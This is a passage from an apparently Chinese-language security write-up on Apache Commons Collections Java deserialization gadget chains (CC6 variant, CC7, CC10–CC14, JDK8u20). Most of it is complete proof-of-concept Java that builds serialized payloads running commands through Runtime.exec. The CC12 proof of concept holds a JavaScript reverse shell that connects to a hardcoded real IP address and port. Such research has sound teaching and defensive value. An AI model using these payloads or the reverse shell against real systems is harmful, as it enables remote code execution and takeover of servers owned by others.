ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); objectinputstream.readObject(); objectinputstream.close(); System.out.println(Base64.encodeBase64String(barr.toByteArray())); }catch(Exception e){ e.printStackTrace(); } } } 🚩CC9_DefaultedMap LazyMap因为用的太广而已被重视, 所以采取了DefaultedMap代替LazyMap, 它拥有和LazyMap同样的特性 // DefaultedMap.get public Object get(Object key) { // create value for key if key is not currently in the map if (map.containsKey(key) == false) { if (value instanceof Transformer) { return ((Transformer) value).transform(key); } return value; } return map.get(key); } 只要出现LazyMap的地方都可替换为DefaultedMap POC package CommonsCollections; import org.apache.commons.codec.binary.Base64; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.DefaultedMap; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class CC6_DefaultedMap { public static void main(String[] args) throws Exception{ Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)}; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}), new ConstantTransformer(1) }; ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers); Map innerMap = new HashMap(); // 调用decorate主要是直接写入的方法是protected, 需要设置权限才行, 而该方法是public Map outerMap = DefaultedMap.decorate(innerMap, chainedTransformer); /**DefaultedMap.get*/ TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, \"keykey\"); /*jdk1.7~jdk1.8*/ Map expMap = new HashMap(); expMap.put(tiedMapEntry, \"valuevalue\"); outerMap.remove(\"keykey\"); //通过反射覆盖原本的iTransformers，防止序列化时在本地执行命令 Field f = chainedTransformer.getClass().getDeclaredField(\"iTransformers\"); f.setAccessible(true); f.set(chainedTransformer, transformers); try{ // serialize ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream objectoutputstream = new ObjectOutputStream(barr); objectoutputstream.writeObject(expMap); objectoutputstream.close(); // unserialize ObjectInputStream objectinputstream = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); objectinputstream.readObject(); objectinputstream.close(); System.out.println(Base64.encodeBase64String(barr.toByteArray())); }catch(Exception e){ e.printStackTrace(); } } } CC7_ Hashtable CommonsCollections7用了Hashtable来代替AnnotationInvocationHandler，不同于前面两种CommonsCollections7并未使用TiredMapEntry，而是用了相同key冲突的方式调用equals来触发Lazy.get函数 本次根据POC来进行分析, 先给出完整的POC package CommonsCollections; import org.apache.commons.codec.binary.Base64; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Hashtable; import java.util.Map; public class CC7_Hashtable { public static void main(String[] args) throws Exception { /**不能加 new ConstantTransformer(1) 会影响payload触发*/ Transformer[] fakeTransformers = new Transformer[] {/*new ConstantTransformer(1)*/}; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}), new ConstantTransformer(1) }; ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers); Map innerMap1 = new HashMap(); Map innerMap2 = new HashMap(); // Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject Map lazyMap1 = LazyMap.decorate(innerMap1, chainedTransformer); /**冲突是测试后写好的,不能乱改*/ lazyMap1.put(\"yy\", 1); Map lazyMap2 = LazyMap.decorate(innerMap2, chainedTransformer); lazyMap2.put(\"zZ\", 1); // Use the colliding Maps as keys in Hashtable Hashtable hashtable = new Hashtable(); hashtable.put(lazyMap1, 1); hashtable.put(lazyMap2, 2); //通过反射覆盖原本的iTransformers，防止序列化时在本地执行命令 Field f = chainedTransformer.getClass().getDeclaredField(\"iTransformers\"); f.setAccessible(true); f.set(chainedTransformer, transformers); // Needed to ensure hash collision after previous manipulations lazyMap2.remove(\"yy\"); // 字节调用写法 ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(hashtable); oos.close(); System.out.println(Base64.encodeBase64String(barr.toByteArray())); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); ois.readObject(); // 写文件写法 FileOutputStream fileOutputStream = new FileOutputStream(\"payload.bin\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(hashtable); objectOutputStream.flush(); objectOutputStream.close(); FileInputStream fileInputStream = new FileInputStream(\"payload.bin\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); objectInputStream.readObject(); } } Hashtable的重复操作 Map innerMap1 = new HashMap(); Map innerMap2 = new HashMap(); // Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject Map lazyMap1 = LazyMap.decorate(innerMap1, chainedTransformer); /**冲突是测试后写好的,不能乱改*/ lazyMap1.put(\"yy\", 1); Map lazyMap2 = LazyMap.decorate(innerMap2, chainedTransformer); lazyMap2.put(\"zZ\", 1); // Use the colliding Maps as keys in Hashtable Hashtable hashtable = new Hashtable(); hashtable.put(lazyMap1, 1); hashtable.put(lazyMap2, 2); 在这段代码中，实例化了两个HashMap，并对两个HashMap使用了LazyMap将transformerChain和HashMap绑定到一起。然后分别添加到Hashtable中， 但是前面看到的都是使用一次，为什么这里需要重复2次重复的操作呢？ 从Hashtable.readObject跟进 private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException { // Read in the length, threshold, and loadfactor s.defaultReadObject(); // set hashSeed UNSAFE.putIntVolatile(this, HASHSEED_OFFSET, sun.misc.Hashing.randomHashSeed(this)); // Read the original length of the array and number of elements int origlength = s.readInt(); int elements = s.readInt(); // Compute new size with a bit of room 5% to grow but // no larger than the original size. Make the length // odd if it's large enough, this helps distribute the entries. // Guard against the length ending up zero, that's not valid. int length = (int)(elements * loadFactor) + (elements / 20) + 3; if (length > elements && (length & 1) == 0) length--; if (origlength > 0 && length > origlength) length = origlength; Entry[] table = new Entry[length]; threshold = (int) Math.min(length * loadFactor, MAX_ARRAY_SIZE + 1); count = 0; useAltHashing = sun.misc.VM.isBooted() && (length >= Holder.ALTERNATIVE_HASHING_THRESHOLD); // Read the number of elements and then all the key/value objects for (; elements > 0; elements--) { K key = (K)s.readObject(); V value = (V)s.readObject(); // synch could be eliminated for performance reconstitutionPut(table, key, value); } this.table = table; } Hashtable的reconstitutionPut方法是被遍历调用的 第一次调用的时候，并不会走入到reconstitutionPut方法for循环里面，因为tab[index]的内容是空的，在下面会对tab[index]进行赋值。在第二次调用reconstitutionPut时，tab中才有内容，我们才有机会进入到这个for循环中，从而调用equals方法。这也是为什么要调用两次put的原因。 这里的equals函数取决于key的对象，利用链用的是LazyMap对象，实际调用的是父类AbstractMapDecorator的equals函数 public boolean equals(Object object) { if (object == this) { return true; } return map.equals(object); } 这里又调用了map的equals函数，这里实际调用的是HashMap的父类AbstractMap的equals函数 public boolean equals(Object o) { if (o == this) return true; if (!(o instanceof Map)) return false; // o赋值给m, 值为LazyMap对象 Map m = (Map) o; if (m.size() != size()) return false; try { Iterator> i = entrySet().iterator(); while (i.hasNext()) { Entry e = i.next(); // key = \"yy\";value = 1; K key = e.getKey(); V value = e.getValue(); if (value == null) { if (!(m.get(key)==null && m.containsKey(key))) return false; } else { // 触发LazyMap.get if (!value.equals(m.get(key))) return false; } } } catch (ClassCastException unused) { return false; } catch (NullPointerException unused) { return false; } return true; } 后续就是触发LazyMap.get lazyMap2.remove(\"yy\"); 至于为什么需要在最后面移除该值，其实在LazyMap的get方法里面就可以看到 public Object get(Object key) { // create value for key if key is not currently in the map // 包含键值将无法进入if语句中 if (map.containsKey(key) == false) { Object value = factory.transform(key); map.put(key, value); return value; } return map.get(key); } 如果不移除该方法就会走不进该判断条件的代码块中。而后面也会再调用一次put方法。 调用的两次put其中map中key的值分别为yy和zZ 这里index的计算方式关键是hash，而hash是通过key.hashCode得来的，在java中有一个小bug： \"yy\".hashCode() == \"zZ\".hashCode() 正是这个小bug让这里能够利用，所以这里我们需要将map中put的值设置为yy和zZ，使两次计算的index都一样，才能够进入到for循环中。 CC10_mixed with CC6 and CC7 看到 Hashtable.reconstitutionPut 中的有一处 hashCode 的调用 int hash = hash(key); // 跟进hash private int hash(Object k) { if (useAltHashing) { if (k.getClass() == String.class) { return sun.misc.Hashing.stringHash32((String) k); } else { // 此处调用hashCode int h = hashSeed ^ k.hashCode(); // This function ensures that hashCodes that differ only by // constant multiples at each bit position have a bounded // number of collisions (approximately 8 at default load factor). h ^= (h >>> 20) ^ (h >>> 12); return h ^ (h >>> 7) ^ (h >>> 4); } } else { return k.hashCode(); } } 如果key值被代替为TiedMapEntry对象, 这里就能触发LazyMap.get POC package CommonsCollections; import org.apache.commons.codec.binary.Base64; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Hashtable; import java.util.Map; public class CommonsCollections10 { public static void main(String[] args) throws Exception{ /**不能加 new ConstantTransformer(1) 会影响payload触发*/ Transformer[] fakeTransformers = new Transformer[] {/*new ConstantTransformer(1)*/}; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}), new ConstantTransformer(1) }; ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers); Map innerMap = new HashMap(); // 调用decorate主要是直接写入的方法是protected, 需要设置权限才行, 而该方法是public Map outerMap = LazyMap.decorate(innerMap, chainedTransformer); TiedMapEntry tiedMapEntry1 = new TiedMapEntry(outerMap, \"keykey\"); // Use the colliding Maps as keys in Hashtable Hashtable hashtable = new Hashtable(); hashtable.put(\"keykey\", 1); // 获取hashtable的table类属性 Field tableField = Hashtable.class.getDeclaredField(\"table\"); tableField.setAccessible(true); Object[] table = (Object[])tableField.get(hashtable); Object tiedMapEntry2 = table[0]; if(tiedMapEntry2 == null) tiedMapEntry2 = table[1]; // 获取Hashtable.Entry的key属性 Field keyField = tiedMapEntry2.getClass().getDeclaredField(\"key\"); keyField.setAccessible(true); // 将key属性给替换成构造好的TiedMapEntry实例 keyField.set(tiedMapEntry2, tiedMapEntry1); //通过反射覆盖原本的iTransformers，防止序列化时在本地执行命令 Field f = chainedTransformer.getClass().getDeclaredField(\"iTransformers\"); f.setAccessible(true); f.set(chainedTransformer, transformers); // 字节调用写法 ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(hashtable); oos.close(); System.out.println(Base64.encodeBase64String(barr.toByteArray())); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); ois.readObject(); // 写文件写法 FileOutputStream fileOutputStream = new FileOutputStream(\"payload.bin\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(hashtable); objectOutputStream.flush(); objectOutputStream.close(); FileInputStream fileInputStream = new FileInputStream(\"payload.bin\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); objectInputStream.readObject(); } } JDK8u20 参考: https://www.cnpanda.net/sec/974.html https://www.anquanke.com/post/id/87270 https://blog.csdn.net/xiaoWhite_meng/article/details/80980145 官方对jdk7u21的修复 // 改之前 AnnotationType annotationType = null; try { annotationType = AnnotationType.getInstance(type); } catch(IllegalArgumentException e) { // Class is no longer an annotation type; all bets are off return; } // 改之后 AnnotationType annotationType = null; try { annotationType = AnnotationType.getInstance(type); } catch(IllegalArgumentException e) { // Class is no longer an annotation type; time to punch out throw new java.io.InvalidObjectException(\"Non-annotation type in annotation serial stream\"); } 这里增加了一步对type字段类型的检查，如果传入的类型不是AnnotationType，那么就会抛出一个异常，退出反序列化流程。然而我们在构造payload的时候，将type赋值为Templates.class，自然是过不了这个检查，所以JDK7u21也就无法在后续的Java版本上使用了 实际上在jdk7u21漏洞中，我们传入的AnnotationInvocationHandler对象在异常被抛出前，已经从序列化数据中被还原出来。换句话说就是我们把恶意的种子种到了运行对象中，但是因为出现异常导致该种子没法生长，只要我们解决了这个异常，那么就可以重新达到我们的目的 通过在JDK7u21的proxy对象（LinkedHashSet的第二个数据）中插入一个假的成员，使其为BeanContextSupport的对象，在反序列化的时候这个数据会被抛弃掉，因为实际上类的定义中并没有这么一个成员，但是该对象依然会被反序列化并且为其分配handle，那么在BeanContextSupport的反序列化过程中，就可以利用前面提到的try…catch…结构顺利的还原出AnnotationInvocationHandler对象，并且通过构造序列化数据完成整个序列化流程 // readObject private synchronized void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException { synchronized(BeanContext.globalHierarchyLock) { ois.defaultReadObject(); initialize(); bcsPreDeserializationHook(ois); if (serializable > 0 && this.equals(getBeanContextPeer())) readChildren(ois); deserialize(ois, bcmListeners = new ArrayList(1)); } } // readChildren public final void readChildren(ObjectInputStream ois) throws IOException, ClassNotFoundException { int count = serializable; while (count-- > 0) { Object child = null; BeanContextSupport.BCSChild bscc = null; try { child = ois.readObject(); bscc = (BeanContextSupport.BCSChild)ois.readObject(); } catch (IOException ioe) { continue; } catch (ClassNotFoundException cnfe) { continue; } synchronized(child) { BeanContextChild bcc = null; try { bcc = (BeanContextChild)child; } catch (ClassCastException cce) { // do nothing; } if (bcc != null) { try { bcc.setBeanContext(getBeanContextPeer()); bcc.addPropertyChangeListener(\"beanContext\", childPCL); bcc.addVetoableChangeListener(\"beanContext\", childVCL); } catch (PropertyVetoException pve) { continue; } } childDeserializedHook(child, bscc); } } } 在构造上需要对其序列化生成的二进制文件进行分析, 比较复杂, 参考师傅们的payload: https://github.com/pwntester/JRE8u20_RCE_Gadget CC11_mixed with CC2 and CC6 CommonsCollections11主要是通过InvokerTransformer去调用TemplatesInmpl的newTransformer POC package CommonsCollections; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.codec.binary.Base64; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.DefaultedMap; import java.io.*; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class CommonsCollections11 { public static void main(String[] args) throws Exception{ // ClassPool是 CtClass 对象的容器。实例化一个ClassPool容器。 ClassPool classPool = ClassPool.getDefault(); // 向容器中的类搜索路径的起始位置插入AbstractTranslet.class，个人认为是方便让后面能够找到这个类 classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); // 使用容器新建一个CtClass，相当于新建一个class，类名为Evil CtClass ctClass = classPool.makeClass(\"Evil\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"%s\\\");\"; cmd = String.format(cmd, \"calc.exe\"); // 给这个类创建 static 代码块，并插入到类中 ctClass.makeClassInitializer().insertBefore(cmd); String className = \"Evil\" + System.nanoTime(); // 重新设置类名为一个随机的名字 ctClass.setName(className); // 给这个类添加一个父类，即继承该父类。 ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName())); // 设置父类为AbstractTranslet，避免报错 // 将这个类输出到项目目录下 // ctClass.writeFile(\"./\"); // 将这个class转换为字节数组 byte[] classBytes = ctClass.toBytecode(); // 将字节数组放置到一个二维数组的第一个元素 byte[][] targetByteCodes = new byte[][]{classBytes}; // 实例化TemplatesImpl对象 TemplatesImpl templates = TemplatesImpl.class.newInstance(); // 通过反射设置字段的值为二维字节数组 setFieldValue(templates, \"_bytecodes\", targetByteCodes); // 进入 defineTransletClasses() 方法需要的条件 setFieldValue(templates, \"_name\", \"name\"); setFieldValue(templates, \"_class\", null); Transformer transformer = new InvokerTransformer(\"getClass\", null, null); Map innerMap = new HashMap(); // Map outerMap = LazyMap.decorate(innerMap, transformer); Map outerMap = DefaultedMap.decorate(innerMap, transformer); TiedMapEntry tiedmapentry = new TiedMapEntry(outerMap, templates); Map expMap = new HashMap(); expMap.put(tiedmapentry, \"valuevalue\"); // 清除键值 outerMap.clear(); // 通过反射覆盖原本的iMethodName，防止序列化时在本地触发恶意方法 setFieldValue(transformer, \"iMethodName\", \"newTransformer\"); // 字节调用写法 ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(expMap); oos.close(); System.out.println(Base64.encodeBase64String(barr.toByteArray())); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); ois.readObject(); // 写文件写法 FileOutputStream fileOutputStream = new FileOutputStream(\"payload.bin\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(expMap); objectOutputStream.flush(); objectOutputStream.close(); FileInputStream fileInputStream = new FileInputStream(\"payload.bin\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); objectInputStream.readObject(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); } return field; } } CC12_Update by CC6 参考: https://forum.butian.net/share/120 https://xz.aliyun.com/t/8673 javax.script.ScriptEngineManager 引擎调用 JDK内置的JS引擎 科普一下javax.script.ScriptEngineManager.这个类在jdk中可以用以执行一些脚本语言,例如比较流行的有JavaScript、Scala、JRuby、Jython和Groovy等.而JavaSE6中自带了JavaScript语言的脚本引擎,基于Mozilla的Rhino实现,可以通过三种方式查找脚本引擎: 1.通过脚本名称获取： ScriptEngine engine = new ScriptEngineManager().getEngineByName(\"JavaScript\"); 2.通过MIME类型来获取： ScriptEngine engine = new ScriptEngineManager().getEngineByExtension(\"js\"); 3.通过MIME类型来获取： ScriptEngine engine = new ScriptEngineManager().getEngineByMimeType(\"text/javascript\"); 例如我们要和js混编打印一个HelloWord： ScriptEngineManager manager = new ScriptEngineManager(); ScriptEngine engine = manager.getEngineByName(\"JavaScript\"); engine.eval(\"println('Hello Word');\"); 当然反射的写法如下： Class clazz = Class.forName(\"javax.script.ScriptEngineManager\"); Object manager = clazz.getDeclaredConstructor().newInstance(); Method getEngineByName = clazz.getDeclaredMethod(\"getEngineByName\", String.class); Object scriptEngine = getEngineByName.invoke(manager,\"JavaScript\"); Method eval = scriptEngine.getClass().getMethod(\"eval\",String.class); eval.invoke(scriptEngine,\"println('Hello Word');\"); 注意: 由于是和js混编,所以要充分注意js的一些语法和Java语法的区别 1.变量命名 js是弱类型的语言,所有变量使用var即可,且不需要声明类型也不支持类型转换. 例如 String a 和 int b需要写为var a 和 var b. 2.异常捕捉 异常不用声明类型 例如 try{ var a; }catch (e){ } POC package CommonsCollections; import org.apache.commons.codec.binary.Base64; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import javax.script.ScriptEngineManager; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.HashSet; import java.util.Map; public class CommonsCollections12 { // private static String jscmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\");\"; // DNS测试 // private static String u = \"http://95s6my.dnslog.cn\"; // private static String jscmd = String.format(\"new java.util.HashMap().put(new java.net.URL(\\\"%s\\\"), \\\"2\\\");\", u); // 延时测试 // private static String time = \"3000\"; // private static String jscmd = String.format(\"java.lang.Thread.sleep(%s);\", time);; // java.net.Socket 反弹shell private static String host = \"81.70.101.91\"; private static int port = 8888; private static String jscmd = String.format(\"var host = \\\"%s\\\";\\n\" + \"var port = %d;\\n\" + \"var p;\\n\" + \"var os = java.lang.System.getProperty(\\\"os.name\\\").toLowerCase(java.util.Locale.ENGLISH);\\n\" + \"if(os.contains(\\\"win\\\")){\\n\" + \" p = new java.lang.ProcessBuilder(\\\"cmd\\\").redirectErrorStream(true).start();\\n\" + \" }else{\\n\" + \" p = new java.lang.ProcessBuilder(\\\"sh\\\").redirectErrorStream(true).start();\\n\" + \" }\\n\" + \"var s = new java.net.Socket(host,port);\\n\" + \"var pi = p.getInputStream(),pe = p.getErrorStream(),si = s.getInputStream();\\n\" + \"var po = p.getOutputStream(),so = s.getOutputStream();\\n\" + \"while(!s.isClosed()) {\\n\" + \"while(pi.available()>0) {\\n\" + \"so.write(pi.read());\\n\" + \"}\\n\" + \"while(pe.available()>0) {\\n\" + \"so.write(pe.read());\\n\" + \"}\\n\" + \"while(si.available()>0) {\\n\" + \"po.write(si.read());\\n\" + \"}\\n\" + \"so.flush();\\n\" + \"po.flush();\\n\" + \"java.lang.Thread.sleep(50);\\n\" + \"try {\\n\" + \"p.exitValue();\\n\" + \"break;\\n\" + \"}\\n\" + \"catch (e){\\n\" + \"}\\n\" + \"};\\n\" + \"p.destroy();\\n\" + \"s.close();\", host, port); public static void main(String[] args) throws Exception{ String[] execArgs = new String[]{jscmd}; Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)}; Transformer[] transformers = new Transformer[]{new ConstantTransformer(ScriptEngineManager.class), new InvokerTransformer(\"newInstance\", new Class[0], new Object[0]), new InvokerTransformer(\"getEngineByName\", new Class[]{String.class}, new Object[]{\"JavaScript\"}), new InvokerTransformer(\"eval\", new Class[]{String.class}, execArgs), new ConstantTransformer(1)}; ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers); Map innerMap = new HashMap(); // 调用decorate主要是直接写入的方法是protected, 需要设置权限才行, 而该方法是public Map outerMap = LazyMap.decorate(innerMap, chainedTransformer); TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, \"ricky\"); /*jdk1.8*/ HashSet hashSet = new HashSet(1); hashSet.add(tiedMapEntry); outerMap.remove(\"ricky\"); //通过反射覆盖原本的iTransformers，防止序列化时在本地执行命令 Field f = chainedTransformer.getClass().getDeclaredField(\"iTransformers\"); f.setAccessible(true); f.set(chainedTransformer, transformers); try{ // serialize ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream objectoutputstream = new ObjectOutputStream(barr); objectoutputstream.writeObject(hashSet); objectoutputstream.close(); // unserialize ObjectInputStream objectinputstream = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); objectinputstream.readObject(); objectinputstream.close(); System.out.println(Base64.encodeBase64String(barr.toByteArray())); }catch(Exception e){ e.printStackTrace(); } } } CC13 参考: https://forum.butian.net/share/1233 CommonCollections DualTreeBidiMap 利用链的触发点是在 org.apache.commons.collections.bidimap.DualHashBidiMap 类的readObject方法, 在readObject方法中调用了putAll方法，传入的map参数是通过反序列化得到的 public void putAll(Map map) { for (Iterator it = map.entrySet().iterator(); it.hasNext();) { Map.Entry entry = (Map.Entry) it.next(); put(entry.getKey(), entry.getValue()); } } 通过put对象中的 containsKey public Object put(Object key, Object value) { if (maps[0].containsKey(key)) { maps[1].remove(maps[0].get(key)); } if (maps[1].containsKey(value)) { maps[0].remove(maps[1].get(value)); } final Object obj = maps[0].put(key, value); maps[1].put(value, key); return obj; } 控制map[0]为TiedMapEntry对象, 在containsKey方法中会调用hash(key) 方法计算传入的key的hash, 而在hash方法中会调用key.hashCode()方法触发 public boolean containsKey(Object key) { return getNode(hash(key), key) != null; } POC package CommonsCollections; import org.apache.commons.collections.BidiMap; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class CC13_DualHashBidiMap { public static void main(String[] args) throws Exception{ Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)}; Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class }, new Object[] {\"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] {String.class }, new Object[] {\"calc.exe\"}), new ConstantTransformer(1) }; Transformer chainedTransformer = new ChainedTransformer(fakeTransformers); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, chainedTransformer); TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, \"1\"); Map expMap = new HashMap(); expMap.put(\"2\", tiedMapEntry); // 控制map[0]为TiedMapEntry对象 Class clazz = Class.forName(\"org.apache.commons.collections.bidimap.DualHashBidiMap\"); Constructor constructor = clazz.getDeclaredConstructor(Map.class, Map.class, BidiMap.class); constructor.setAccessible(true); Object dualHashBidiMap = constructor.newInstance(expMap, null, null); //通过反射覆盖原本的iTransformers，防止序列化时在本地执行命令 Field f = chainedTransformer.getClass().getDeclaredField(\"iTransformers\"); f.setAccessible(true); f.set(chainedTransformer, transformers); ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(dualHashBidiMap); ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray()); ObjectInputStream ois = new ObjectInputStream(bais); ois.readObject(); } } CommonCollections4 DualTreeBidiMap 触发点是在org.apache.commons.collections4.bidimap.DualTreeBidiMap类的readObject方法，同样是调用了putAll方法，并且DualTreeBidiMap类同样是继承自AbstractDualBidiMap抽象类 public void putAll(final Map map) { for (final Map.Entry entry : map.entrySet()) { put(entry.getKey(), entry.getValue()); } } 直接来看put方法的定义，这里的利用点不再是containsKey方法，因为在readObject方法中this.normalMap和this.reverseMap是被赋值为空的TreeMap对象，所以无法再利用，不过在下面调用了this.normalMap和this.reverseMap对象的put方法，也就是TreeMap的put方法 public V put(final K key, final V value) { if (normalMap.containsKey(key)) { reverseMap.remove(normalMap.get(key)); } if (reverseMap.containsKey(value)) { normalMap.remove(reverseMap.get(value)); } final V obj = normalMap.put(key, value); reverseMap.put(value, key); return obj; } 在TreeMap的put方法中会调用compare方法, 而在compare方法中又会调用成员变量comparator的compare方法如果能控制这里的comparator为TransformingComparator对象，就可以完成后半部分利用链的构造，因为用到了TransformingComparator类，而TransformingComparator类在Commons Collections 4.0版本下实现了Serializable接口，所以该利用链在CommonsCollections 4.0版本下才可利用, DualTreeBidiMap对象的成员变量comparator在构造方法中是通过传入的keyComparator参数进行赋值，所以是可控的 POC package CommonsCollections; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.bidimap.DualTreeBidiMap; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.*; import java.lang.reflect.Field; public class CC14_DualTreeBidiMap { public static void main(String[] args) throws Exception{ Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class }, new Object[] {\"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] {String.class }, new Object[] {\"calc.exe\"}), new ConstantTransformer(1) }; Transformer chainedTransformer = new ChainedTransformer(new ConstantTransformer(1)); TransformingComparator comparator = new TransformingComparator(chainedTransformer); DualTreeBidiMap dualTreeBidiMap = new DualTreeBidiMap(comparator, comparator); dualTreeBidiMap.put(\"demo\", \"demo\"); Field field = chainedTransformer.getClass().getDeclaredField(\"iTransformers\"); field.setAccessible(true); field.set(chainedTransformer, transformers); ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(dualTreeBidiMap); ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray()); ObjectInputStream ois = new ObjectInputStream(bais); ois.readObject(); } } CommonCollections4 DualLinkedHashBidiMap 同理CommonCollections 